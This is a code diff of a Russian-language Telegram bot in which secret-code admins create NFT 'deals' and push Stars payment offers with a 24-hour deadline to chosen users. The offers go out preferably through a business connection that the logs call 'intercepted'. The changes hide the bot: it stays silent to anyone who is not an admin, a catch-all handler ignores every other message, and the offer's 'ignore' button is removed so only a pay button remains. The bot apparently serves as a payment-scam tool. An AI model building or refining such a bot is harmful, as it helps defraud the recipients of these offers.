@@ -9,13 +9,7 @@ from aiogram.types import (
     Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
     LabeledPrice, PreCheckoutQuery, BusinessConnection,
     KeyboardButton, ReplyKeyboardMarkup, KeyboardButtonRequestUsers,
-    UsersShared, FSInputFile
-)
-from aiogram.types import (
-    InputRichMessage,
-    InputRichBlockButtons,
-    InputRichBlockParagraph,
-    RichMessageButton,
+    UsersShared
 )
 from aiogram.filters import CommandStart, Command, CommandObject
 from aiogram.fsm.state import State, StatesGroup
@@ -98,7 +92,7 @@ async def get_setting(key: str):
 
 
 async def is_admin(user_id: int, username: str) -> bool:
-    if username == OWNER_USERNAME:
+    if username and username == OWNER_USERNAME:
         return True
     async with DB_POOL.acquire() as conn:
         row = await conn.fetchrow("SELECT user_id FROM admins WHERE user_id=$1", user_id)
@@ -112,19 +106,6 @@ async def add_admin(user_id: int, username: str, display_name: str):
             "ON CONFLICT (user_id) DO UPDATE SET username = EXCLUDED.username, display_name = EXCLUDED.display_name",
             user_id, username, display_name
         )
-
-
-async def get_user_display_name(user_id: int, user_obj) -> str:
-    name = f"@{user_obj.username}" if user_obj.username else (user_obj.first_name or "Пользователь")
-    try:
-        async with DB_POOL.acquire() as conn:
-            await conn.execute(
-                "UPDATE admins SET username=$1, display_name=$2 WHERE user_id=$3",
-                user_obj.username, name, user_id
-            )
-    except Exception:
-        pass
-    return name
 
 
 # ================= ЗАГРУЗКА ФОТО =================
@@ -218,27 +199,6 @@ async def get_current_bot_avatar_url():
         return None
 
 
-# ================= БЕЗОПАСНАЯ ОТПРАВКА RICH =================
-async def safe_send_rich(chat_id: int, rich_message, business_connection_id: str = None) -> bool:
-    """
-    Пытается отправить rich message.
-    Если клиент не поддерживает — возвращает False, чтобы caller сделал fallback.
-    """
-    try:
-        kwargs = {"chat_id": chat_id, "rich_message": rich_message}
-        if business_connection_id:
-            kwargs["business_connection_id"] = business_connection_id
-        await bot.send_rich_message(**kwargs)
-        return True
-    except Exception as e:
-        err_text = str(e).lower()
-        if "not supported" in err_text or "unsupported" in err_text:
-            print(f"[safe_send_rich] Клиент не поддерживает rich message")
-        else:
-            print(f"[safe_send_rich] Ошибка: {e}")
-        return False
-
-
 # ================= FSM =================
 class DealForm(StatesGroup):
     nft_name = State()
@@ -266,7 +226,7 @@ async def on_business_message(message: Message):
         print(f"✅ Business Connection перехвачен: {message.business_connection_id}")
 
 
-# ================= АКТИВАЦИЯ ПРАВ =================
+# ================= АКТИВАЦИЯ ПРАВ (единственный способ стать админом) =================
 @dp.message(F.text == SECRET_CODE)
 async def activate_admin(message: Message):
     name = f"@{message.from_user.username}" if message.from_user.username else (message.from_user.first_name or "Пользователь")
@@ -291,8 +251,8 @@ async def show_lots(target_message: Message, owner_id: int):
         nft_name = r["nft_name"]
         price = r["price"]
         kb = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="Выбрать получателя", callback_data=f"pick_{deal_id}", style="primary")],
-            [InlineKeyboardButton(text="Удалить", callback_data=f"del_{deal_id}", style="danger")]
+            [InlineKeyboardButton(text="Выбрать получателя", callback_data=f"pick_{deal_id}")],
+            [InlineKeyboardButton(text="Удалить", callback_data=f"del_{deal_id}")]
         ])
         await target_message.answer(
             f"🕯️ <b>{nft_name}</b> — {price}⭐",
@@ -301,14 +261,13 @@ async def show_lots(target_message: Message, owner_id: int):
         )
 
 
-# ================= СТАРТ =================
+# ================= СТАРТ (молчит для не-админов) =================
 @dp.message(CommandStart(deep_link=False))
 async def start(message: Message):
     global BUSINESS_CONNECTION_ID
 
     if not await is_admin(message.from_user.id, message.from_user.username):
-        await message.answer("❌ У вас нет доступа к боту.")
-        return
+        return  # МОЛЧИМ
 
     if not BUSINESS_CONNECTION_ID:
         saved = await get_setting("business_connection_id")
@@ -316,8 +275,8 @@ async def start(message: Message):
             BUSINESS_CONNECTION_ID = saved
 
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="➕ Создать запрос", callback_data="new_deal", style="success")],
-        [InlineKeyboardButton(text="📋 Мои лоты", callback_data="my_lots", style="primary")]
+        [InlineKeyboardButton(text="➕ Создать запрос", callback_data="new_deal")],
+        [InlineKeyboardButton(text="📋 Мои лоты", callback_data="my_lots")]
     ])
     status = "🟢 Подключён" if BUSINESS_CONNECTION_ID else "🔴 Не подключён"
     await message.answer(f"👑 Админ-панель\nBusiness: {status}", reply_markup=kb)
@@ -364,6 +323,7 @@ async def open_payment(user_id: int, deal_id: int):
 @dp.callback_query(F.data == "new_deal")
 async def new_deal(callback: CallbackQuery, state: FSMContext):
     if not await is_admin(callback.from_user.id, callback.from_user.username):
+        await callback.answer()
         return
     await callback.message.answer("1️⃣ Введи название NFT:")
     await state.set_state(DealForm.nft_name)
@@ -372,6 +332,8 @@ async def new_deal(callback: CallbackQuery, state: FSMContext):
 
 @dp.message(DealForm.nft_name)
 async def set_name(message: Message, state: FSMContext):
+    if not await is_admin(message.from_user.id, message.from_user.username):
+        return
     await state.update_data(nft_name=message.text)
     await message.answer("2️⃣ Введи ссылку на NFT:")
     await state.set_state(DealForm.nft_link)
@@ -379,6 +341,8 @@ async def set_name(message: Message, state: FSMContext):
 
 @dp.message(DealForm.nft_link)
 async def set_link(message: Message, state: FSMContext):
+    if not await is_admin(message.from_user.id, message.from_user.username):
+        return
     await state.update_data(nft_link=message.text)
     await message.answer("3️⃣ Введи имя продавца:")
     await state.set_state(DealForm.seller)
@@ -386,6 +350,8 @@ async def set_link(message: Message, state: FSMContext):
 
 @dp.message(DealForm.seller)
 async def set_seller(message: Message, state: FSMContext):
+    if not await is_admin(message.from_user.id, message.from_user.username):
+        return
     await state.update_data(seller=message.text)
     await message.answer("4️⃣ Введи цену в звёздах:")
     await state.set_state(DealForm.price)
@@ -393,6 +359,8 @@ async def set_seller(message: Message, state: FSMContext):
 
 @dp.message(DealForm.price)
 async def set_price(message: Message, state: FSMContext):
+    if not await is_admin(message.from_user.id, message.from_user.username):
+        return
     if not message.text.isdigit():
         await message.answer("❌ Только число.")
         return
@@ -418,6 +386,7 @@ async def set_price(message: Message, state: FSMContext):
 @dp.callback_query(F.data == "my_lots")
 async def my_lots(callback: CallbackQuery):
     if not await is_admin(callback.from_user.id, callback.from_user.username):
+        await callback.answer()
         return
     await show_lots(callback.message, callback.from_user.id)
     await callback.answer()
@@ -487,6 +456,10 @@ async def pick_lot(callback: CallbackQuery, state: FSMContext):
 async def on_user_selected(message: Message, state: FSMContext):
     global BUSINESS_CONNECTION_ID
 
+    if not await is_admin(message.from_user.id, message.from_user.username):
+        await state.clear()
+        return
+
     users_shared: UsersShared = message.users_shared
     deal_id = users_shared.request_id
     user_id = users_shared.users[0].user_id
@@ -546,51 +519,44 @@ async def on_user_selected(message: Message, state: FSMContext):
         await state.clear()
         return
 
-    # --- Rich Message (со стилями кнопок) ---
-    rich_message = InputRichMessage(
-        blocks=[
-            InputRichBlockParagraph(text=f"{sender_name} предлагает {nft_link} За {price} звезд."),
-            InputRichBlockParagraph(text="\n\nПредложение действует 24 часа"),
-            InputRichBlockButtons(buttons=[RichMessageButton(text="ПРИНЯТЬ", url=invoice_link, style="success")]),
-            InputRichBlockButtons(buttons=[RichMessageButton(text="ИГНОРИРОВАТЬ", url="https://t.me/NorikAmiri", style="danger")])
-        ]
+    # Обычное сообщение (работает везде)
+    text = (
+        f"👤 <b>{sender_name}</b> предлагает вам <b>{nft_name}</b>\n"
+        f"🔗 {nft_link}\n"
+        f"💰 Цена: <b>{price}⭐</b>\n\n"
+        f"Предложение действует 24 часа"
     )
+
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="ОПЛАТИТЬ", url=invoice_link)]
+    ])
 
     sent_via = None
     last_error = None
 
-    # Попытка 1: через business connection
     if BUSINESS_CONNECTION_ID:
-        if await safe_send_rich(user_id, rich_message, BUSINESS_CONNECTION_ID):
-            sent_via = "business"
-            print(f"[send] OK rich через business → {user_id}")
-
-    # Попытка 2: напрямую
-    if not sent_via:
-        if await safe_send_rich(user_id, rich_message):
-            sent_via = "direct"
-            print(f"[send] OK rich напрямую → {user_id}")
-
-    # Попытка 3: fallback — обычное сообщение с inline-кнопкой
-    if not sent_via:
         try:
-            kb = InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="ОПЛАТИТЬ", url=invoice_link)]
-            ])
             await bot.send_message(
-                user_id,
-                f"👤 <b>{sender_name}</b> предлагает вам <b>{nft_name}</b>\n"
-                f"🔗 {nft_link}\n"
-                f"💰 Цена: <b>{price}⭐</b>\n\n"
-                f"Предложение действует 24 часа",
+                chat_id=user_id,
+                text=text,
                 parse_mode="HTML",
-                reply_markup=kb
+                reply_markup=kb,
+                business_connection_id=BUSINESS_CONNECTION_ID
             )
-            sent_via = "fallback"
-            print(f"[send] OK fallback → {user_id}")
+            sent_via = "business"
+            print(f"[send] OK через business → {user_id}")
         except Exception as e:
             last_error = str(e)
-            print(f"[send fallback] Ошибка: {e}")
+            print(f"[send business] Ошибка: {e}")
+
+    if not sent_via:
+        try:
+            await bot.send_message(user_id, text, parse_mode="HTML", reply_markup=kb)
+            sent_via = "direct"
+            print(f"[send] OK напрямую → {user_id}")
+        except Exception as e:
+            last_error = str(e)
+            print(f"[send direct] Ошибка: {e}")
 
     if sent_via:
         await message.answer("✅ Отправлено!", reply_markup=ReplyKeyboardMarkup(keyboard=[], resize_keyboard=True))
@@ -681,6 +647,13 @@ async def start_web_server():
     site = web.TCPSite(runner, "0.0.0.0", PORT)
     await site.start()
     print(f"🌐 Веб-сервер на порту {PORT}")
+
+
+# ================= ЗАГЛУШКА (молчит для всех) =================
+@dp.message()
+async def catch_all(message: Message):
+    """Ловит всё, что не попало в другие хендлеры. Молчим."""
+    return
 
 
 # ================= ЗАПУСК =================
